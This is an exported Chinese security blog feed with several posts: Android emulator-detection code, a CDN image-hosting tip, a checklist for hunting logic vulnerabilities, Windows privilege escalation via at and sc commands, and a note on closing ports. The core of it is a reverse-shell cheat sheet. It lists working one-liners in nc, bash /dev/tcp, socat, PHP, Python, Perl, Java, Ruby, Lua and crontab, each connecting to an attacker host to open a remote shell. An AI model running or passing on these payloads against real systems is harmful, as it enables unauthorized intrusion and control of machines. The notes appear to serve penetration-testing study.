class="line">android.os.Build.MANUFACTURER,</span><br><span class="line">android.os.Build.MODEL</span><br><span class="line">...</span><br></pre></td></tr></table></figure><ul><li>检查mac地址</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Enumeration networkInterfaces;</span><br><span class="line">String str &#x3D; null;</span><br><span class="line">networkInterfaces &#x3D; NetworkInterface.getNetworkInterfaces();</span><br><span class="line">while (networkInterfaces.hasMoreElements()) &#123;</span><br><span class="line">NetworkInterface networkInterface &#x3D; (NetworkInterface) networkInterfaces.nextElement();</span><br><span class="line">if (networkInterface !&#x3D; null) &#123;</span><br><span class="line">byte[] hardwareAddress;</span><br><span class="line">byte[] bArr &#x3D; new byte[0];</span><br><span class="line">hardwareAddress &#x3D; networkInterface.getHardwareAddress();</span><br><span class="line">if (!(hardwareAddress &#x3D;&#x3D; null || hardwareAddress.length &#x3D;&#x3D; 0)) &#123;</span><br><span class="line">String str2;</span><br><span class="line">StringBuilder stringBuilder &#x3D; new StringBuilder();</span><br><span class="line">...&#x2F;&#x2F;方法太长</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>检查电池温度，轮询检查电量，充电状态</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IntentFilter filter &#x3D; new IntentFilter(Intent.ACTION_BATTERY_CHANGED);</span><br><span class="line">Intent batteryStatus &#x3D; context.registerReceiver(null, filter);</span><br><span class="line">if (batteryStatus &#x3D;&#x3D; null) return false;</span><br><span class="line">int chargePlug &#x3D; batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);</span><br><span class="line">return chargePlug &#x3D;&#x3D; BatteryManager.BATTERY_PLUGGED_USB;&#x2F;&#x2F;检测usb充电</span><br></pre></td></tr></table></figure><ul><li>基带信息</li></ul><p>基带是手机上的一块电路板，刷基带实际上就是刷这个电路的控制软件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">     roSecureObj &#x3D; Class.forName(&quot;android.os.SystemProperties&quot;)</span><br><span class="line">                    .getMethod(&quot;get&quot;, String.class)</span><br><span class="line">                    .invoke(null, &quot;gsm.version.baseband&quot;);</span><br><span class="line"> if (roSecureObj !&#x3D; null) value &#x3D; (String) roSecureObj;</span><br><span class="line"> &#125; catch (Exception e) &#123;</span><br><span class="line">            value &#x3D; null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>处理器信息</li></ul><p>最简单的方法就是直接拿android.os.Build.BOARD，实际上也是去读取ro.product.board值，这个值代表cpu型号，比如msm8998是骁龙835，hi3650是麒麟950。</p><p>这个值真机几乎不为空，AS模拟器会有如gphone的特征值，部分模拟器上是可以随时变更的（因为拿模拟器来玩高帧率模式的手游）。</p><p>可是还有一个ro.board.platform值，这个值代表主板平台，极少的模拟器会去更改这个值，甚至有的模拟器没有这个值，一般来说真机的两值相等。</p><p>当然真机也有例外，测试机一加5T两者都是msm8998，而华为P9 board值EVA-AL10,platform值hi3650。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String productBoard &#x3D; CommandUtil.getSingleInstance().getProperty(&quot;ro.product.board&quot;);</span><br><span class="line">if (productBoard &#x3D;&#x3D; null | &quot;&quot;.equals(productBoard)) ++suspectCount;</span><br><span class="line"></span><br><span class="line">String boardPlatform &#x3D; CommandUtil.getSingleInstance().getProperty(&quot;ro.board.platform&quot;);</span><br><span class="line">if (boardPlatform &#x3D;&#x3D; null | &quot;&quot;.equals(boardPlatform)) ++suspectCount;</span><br><span class="line"></span><br><span class="line">if (productBoard !&#x3D; null &amp;&amp; boardPlatform !&#x3D; null &amp;&amp; !productBoard.equals(boardPlatform))</span><br><span class="line">    ++suspectCount;</span><br></pre></td></tr></table></figure><ul><li>渠道信息</li></ul><p>渠道信息是ro.build.flavor值，在有限的真机和模拟机器的测试情况下，有以下推测 『真机基本上都有这个值，部分模拟器没有这个值，基于vbox的模拟器上有特征值：vbox』</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String buildFlavor &#x3D; CommandUtil.getSingleInstance().getProperty(&quot;ro.build.flavor&quot;);</span><br><span class="line">if (buildFlavor &#x3D;&#x3D; null | &quot;&quot;.equals(buildFlavor) | (buildFlavor !&#x3D; null &amp;&amp; buildFlavor.contains(&quot;vbox&quot;)))</span><br><span class="line">    ++suspectCount;</span><br></pre></td></tr></table></figure><ul><li>进程组信息</li></ul><p>利用读取maps文件检测软件多开的时候，在部分模拟器上却遇到了runtimeException异常。 原因是读取/proc/self/cgroup进程组信息的时候，部分模拟器没有这个值，因为个人水平有限，暂时不知道原因是什么，不过却刚好拿这个做检测方案。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">process &#x3D; Runtime.getRuntime().exec(&quot;sh&quot;);</span><br><span class="line">            bufferedOutputStream &#x3D; new BufferedOutputStream(process.getOutputStream());</span><br><span class="line">            bufferedInputStream &#x3D; new BufferedInputStream(process.getInputStream());</span><br><span class="line">            bufferedOutputStream.write(&quot;cat &#x2F;proc&#x2F;self&#x2F;cgroup&quot;);</span><br><span class="line">            bufferedOutputStream.write(&#39;\n&#39;);</span><br><span class="line">            bufferedOutputStream.flush();</span><br></pre></td></tr></table></figure><h2 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h2><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/8.png" alt="8"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/722644_2SENQ6BYYPSXAH8.jpg" alt="722644_2SENQ6BYYPSXAH8"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://juejin.cn/post/6844903637840297998#heading-1">一行代码帮你检测Android模拟器</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免费CDN加速GitHub图床</title>
      <link href="2023/11/28/%E5%85%8D%E8%B4%B9CDN%E5%8A%A0%E9%80%9FGitHub%E5%9B%BE%E5%BA%8A/"/>
      <url>2023/11/28/%E5%85%8D%E8%B4%B9CDN%E5%8A%A0%E9%80%9FGitHub%E5%9B%BE%E5%BA%8A/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>由于Github的默认图床是<a href="https://raw.githubusercontent.com/">https://raw.githubusercontent.com</a> 加上GitHub用户名和自己的仓库组成的，而<a href="https://raw.githubusercontent.com/">https://raw.githubusercontent.com</a> 这个地址国内访问速度慢或者访问失效，要解决这种方法，需要将自己的GitHub图床设定一个指定的域名，是可以国内快速的访问的。</p><p>这时候CDN就可以解决这种问题，jsDelivr提供了免费公共的CDN加速服务，其中包括了github加速，所以只要引用自己的资源，就可以实现全球ADN加速效果。</p><blockquote><p>使用方法：cdn.jsdelivr.net/gh/用户名/仓库名@项目主分支</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;dummersoul&#x2F;Picture@main</span><br></pre></td></tr></table></figure><p>在PicGo中自定义域名配置为CDN加速即可（必须加上https://）</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210210231808933.png" alt="image-20210210231808933"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>1、<a href="https://www.iszy.cc/2020/05/05/ufjg58/">https://www.iszy.cc/2020/05/05/ufjg58/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 图床 </tag>
            
            <tag> CDN加速 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑漏洞挖掘思路</title>
      <link href="2023/11/28/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
      <url>2023/11/28/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>1、登录</p><ul><li>无验证码可爆破</li><li>验证码登录爆破（4位，或长期有效）</li><li>验证码登录绕过</li><li>验证码在返回包</li><li>短信轰炸</li><li>邮箱轰炸</li><li>sesslon覆盖</li><li>万能密码</li><li>post注入</li><li>xss</li></ul><p>2、注册</p><ul><li>任意用户注册</li><li>注册覆盖</li><li>验证码在返回包</li><li>短信轰炸</li><li>邮箱轰炸</li><li>xss</li></ul><p>3、密码找回</p><ul><li>任意用户密码重置</li><li>密保问题在前端源码</li><li>验证码爆破</li><li>手机号码篡改为自己的接收短信验证码</li><li>邮箱篡改为自己的接收短信验证码</li></ul><p>4、会员系统（报名系统）</p><ul><li>用户越权访问</li><li>订单越权查看修改</li><li>收货地址越权查看修改</li><li>资料越权查看修改</li><li>换绑手机号短信轰炸</li><li>水平垂直越权</li><li>接口查询</li><li>数据泄露</li><li>文件上传</li><li>资料处xss</li><li>csrf</li></ul><p>5、支付系统</p><ul><li>商品价格修改</li><li>优惠券数量修改</li><li>折扣修改</li><li>商品数量修改</li><li>支付金额修改</li><li>积分修改</li><li>收货地址越权遍历</li><li>订单查看</li><li>备注处xss</li><li>支付成功订单重放</li><li>优惠数量限制突破</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 逻辑漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell的多种姿势</title>
      <link href="2023/11/28/%E5%8F%8D%E5%BC%B9shell/"/>
      <url>2023/11/28/%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>先监听，再反弹</p><p>攻击者监听一律 <code>nc -lvvp port</code>  socat等除外</p><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><p>支持-e</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e &#x2F;bin&#x2F;sh IP 4444</span><br></pre></td></tr></table></figure><p>不支持-e</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; nc ip 8080 0&lt;backpipe | &#x2F;bin&#x2F;bash 1&gt;backpipe</span><br></pre></td></tr></table></figure><blockquote><p>mkfifo命令的作用是创建FIFO特殊文件，通常也称为命名管道，FIFO文件在磁盘上没有数据块，仅用来标识内核中的一条通道，各进程可以打开FIFO文件进行read/write，实际上是在读写内核通道（根本原因在于FIFO文件结构体所指向的read、write函数和常规文件不一样），这样就实现了进程间通信。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc IP 4444 &gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></figure><blockquote><ul><li><code>rm /tmp/f;</code> 不解释</li><li><code>mkfifo /tmp/f;</code> 在tmp目录下写<code>fifo</code>文件<code>f</code></li><li><code>/bin/sh -i 2&gt;&amp;1</code> 将/bin/sh 的标准错误重定向到标准输出</li><li><code>nc x.x.x.x 2333 &gt;/tmp/f</code> 将nc监听到的输入 输入到<code>fifo</code></li></ul></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc x.x.x.x 9999|&#x2F;bin&#x2F;bash|nc x.x.x.x 8888</span><br></pre></td></tr></table></figure><p>从9999端口获取到命令，bash 运行后 将结果返回 8888，所以监听要打开两个一起监听，在9999端口的终端执行命令可以在8888的终端看的结果</p><h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet ip 8080 0&lt;backpipe | &#x2F;bin&#x2F;bash 1&gt;backpipe</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|telnet IP 4444 &gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet x.x.x.x 9999 | &#x2F;bin&#x2F;bash | telnet x.x.x.x 8888</span><br></pre></td></tr></table></figure><p>这也是监听两个端口</p><p>nc -lvvp 9999  (输入)</p><p>nc -lvvp 8888 （输出）</p><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure><blockquote><p>bash -i 打开一个交互的shell</p><p>&gt;&amp; 将标准错误输出重定向到标准输出</p><p>/dev/tcp/ip/port 调用socket,建立socket连接，其中ip是要反弹的主机ip，port是监听端口</p><p>0&gt;&amp;1 标准输入重定向到标准输出，实现与反弹shell的交互</p><ul><li><strong>/dev/tcp/</strong> 是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。</li></ul></blockquote><h3 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h3><p>攻击者监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-listen:6666 -</span><br></pre></td></tr></table></figure><p>受害者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget -q https:&#x2F;&#x2F;github.com&#x2F;andrew-d&#x2F;static-binaries&#x2F;raw&#x2F;master&#x2F;binaries&#x2F;linux&#x2F;x86_64&#x2F;socat -O &#x2F;tmp&#x2F;socat      # 第一步：下载socat到&#x2F;tmp目录下</span><br><span class="line">chmod 755 &#x2F;tmp&#x2F;socat          # 第二步：给socaat授予可以执行权限</span><br><span class="line">&#x2F;tmp&#x2F;socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:ip:6666</span><br></pre></td></tr></table></figure><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;ip&quot;,8888);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;IP&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><p>另外的形式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&#x27;127.0.0.1&#x27;,9000))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span></span><br></pre></td></tr></table></figure><h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;ip&quot;;$p&#x3D;1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure><p>不依赖/bin/bash：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;ip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span><br></pre></td></tr></table></figure><h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure><h3 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br></pre></td></tr></table></figure><p>不依赖/bin/bash：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure><p>如果目标系统运行Windows：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="crontab定时任务"><a href="#crontab定时任务" class="headerlink" title="crontab定时任务"></a>crontab定时任务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/attackerip/1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h3 id="lua"><a href="#lua" class="headerlink" title="lua"></a>lua</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t&#x3D;socket.tcp();t:connect(&#39;IP&#39;,&#39;5555&#39;);os.execute(&#39;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> getshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows提权（一）</title>
      <link href="2023/11/28/Windows%E6%8F%90%E6%9D%83%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>2023/11/28/Windows%E6%8F%90%E6%9D%83%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>Windows提权有很多方式，如系统命令提权，漏洞提权，配置不当提权。本次主记录利用系统命令提权，用于将administrator提升到system</p></blockquote><h2 id="xp-2003提权"><a href="#xp-2003提权" class="headerlink" title="xp,2003提权"></a>xp,2003提权</h2><p><code>at命令</code></p><blockquote><p>AT命令是Windows XP中内置的命令，它也可以媲美Windows中的“计划任务”，而且在计划的安排、任务的管理、工作事务的处理方面，AT命令具有更强大更神通的功能。AT命令可在指定时间和日期、在指定计算机上运行命令和程序。</p></blockquote><p>原理：at默认以system权限运行，所以可以进行提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at 10:30 &#x2F;interactive cmd</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210225095036459.png" alt="image-20210225095036459" style="zoom:80%;" /><p>等待片刻，立即变化权限</p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210225095047278.png" alt="image-20210225095047278" style="zoom:150%;" /><p>虽然cmd是system权限，但是桌面并不是</p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210225095126863.png" alt="image-20210225095126863" style="zoom:50%;" /><p>为了完全提权，在cmd中以刚提权成功的<code>system身份</code>输入 <code>taskmgr.exe</code> 启动任务管理器</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210225095254119.png" alt="image-20210225095254119"></p><p>在任务管理器中<code>结束之前账号开启的桌面进程</code></p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210225095331888.png" alt="image-20210225095331888" style="zoom:50%;" /><p>然后自己添加一个有system权限下开启的桌面进程</p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210225095445042.png" alt="image-20210225095445042" style="zoom:50%;" /><p>再点入登入账号</p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210225095509918.png" alt="image-20210225095509918" style="zoom:50%;" /><p>提权成功了！</p><h2 id="win7-win8提权"><a href="#win7-win8提权" class="headerlink" title="win7,win8提权"></a>win7,win8提权</h2><p>at命令在win7 win8已经被取消了，但是没关系，可以用 <code>sc</code>命令提权</p><blockquote><p>SC命令是XP系统中功能强大的DOS命令,SC命令能与“服务控制器”和已安装设备进行通讯。SC是用于与服务控制管理器和服务进行通信的命令行程序。</p><p>通俗点：sc可以启动一个服务</p></blockquote><p>原理：sc也默认以system权限运行，所以可以进行提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc Create systemcmd binPath&#x3D;&quot;cmd&#x2F;k start&quot; type&#x3D; own type&#x3D; interact</span><br></pre></td></tr></table></figure><ul><li>systemcmd 是服务名称</li><li>binpath 是启动的命令</li><li>type=own 是指服务这个服务属于谁</li><li>type=interact 交互状态</li><li>cmd/k start 启动一个新的cmd窗口</li></ul><p>cmd输入命令后看到</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210225100612751.png" alt="image-20210225100612751"></p><p>说明服务已经创建了，但是刚创建的服务是默认关闭的，所以要手动开启这个服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start systemcmd</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210225100729495.png" alt="image-20210225100729495"></p><p>可以看到新建了一个cmd窗口，且是system权限了，剩下要做的和刚才上面xp,2003桌面提权方式一样，这里就不赘述了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/nEuRhSxrjRqRJCOXabhSmQ">https://mp.weixin.qq.com/s/nEuRhSxrjRqRJCOXabhSmQ</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见的未授权访问漏洞</title>
      <link href="2023/11/28/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
      <url>2023/11/28/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Redis-未授权访问漏洞"><a href="#Redis-未授权访问漏洞" class="headerlink" title="Redis 未授权访问漏洞"></a>Redis 未授权访问漏洞</h2><p><strong>漏洞描述</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> getshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows关闭指定的端口</title>
      <link href="2023/11/28/Windows%E5%85%B3%E9%97%AD%E6%8C%87%E5%AE%9A%E7%9A%84%E7%AB%AF%E5%8F%A3/"/>
      <url>2023/11/28/Windows%E5%85%B3%E9%97%AD%E6%8C%87%E5%AE%9A%E7%9A%84%E7%AB%AF%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="关闭135端口"><a href="#关闭135端口" class="headerlink" title="关闭135端口"></a>关闭135端口</h2><blockquote><p>135端口 主用于RPC（远程过程调用）协议并提供DCOM（分布式组件对象模型）服务，提供RPC可以保证在一台计算机上运行的程序可以顺利地执行远程计算机上的代码；使用DCOM可以通过网络直接通信，能够跨包括HTTP协议在内的多种网络传输。RPC本身在处理通过TCP/IP的消息交换部分有一个漏洞，该漏洞是由于错误的处理格式不正确的消息造成的。该漏洞会影响到RPC与DCOM之间的一个接口，该接口侦听的端口就是135，所以建议关闭135端口。</p></blockquote><h3 id="winxp系统禁用DCOM和RPC的操作步骤"><a href="#winxp系统禁用DCOM和RPC的操作步骤" class="headerlink" title="winxp系统禁用DCOM和RPC的操作步骤"></a>winxp系统禁用DCOM和RPC的操作步骤</h3><p>打开组件服务</p><p>win+R 运行<code>dcomcnfg</code></p><p>计算机——我的电脑——属性</p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210422151525716.png" alt="image-20210422151525716" style="zoom: 80%;" /><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210422151727112.png" alt="image-20210422151727112" style="zoom:50%;" /><p>选择默认协议 面向连接的TCP/IP 单机移除</p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210422152052306.png" alt="image-20210422152052306" style="zoom:50%;" /><p>点击确定后，重启即可关闭135端口</p><h2 id="关闭139端口"><a href="#关闭139端口" class="headerlink" title="关闭139端口"></a>关闭139端口</h2><blockquote><p>139端口是为“NETBIOS Session 